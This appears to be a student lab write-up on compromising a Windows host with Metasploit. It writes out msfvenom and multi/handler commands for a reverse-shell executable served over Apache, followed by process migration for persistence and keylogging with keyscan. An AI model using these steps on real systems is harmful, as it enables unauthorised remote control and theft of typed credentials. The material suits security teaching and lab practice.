# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/d1c628d5-ae70-499f-80a9-2a13ccd7c061)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/e31ee43c-f32b-4dbe-8952-71f28ca4fe6b)


copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/ccb90197-d846-446b-9edf-81b7fd8f1850)

Start apache server sudo systemctl apache2 start
![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/741b1912-c384-4af7-a5f8-d5b399df615c)


Check the status of apache2
![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/68acc408-d223-4f29-a75f-303200d3bf42)

Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/6fc5cb00-1227-41e4-bfb8-d49ba09f2b26)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/fd3d8c0e-7735-4541-b9d3-61234d94d0f5)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/03086928-e82a-4f0e-9fc6-fb7f7d825345)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/078d9018-aa91-496a-962d-1ae4d1f64907)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/ddcabbdd-7142-4df5-a0a1-64124a5422e1)



keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/abinayasangeetha/Compromising-windows-using-Metasploit/assets/119393675/abb9e0f7-45c7-49d4-9548-23693c83d065)


## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
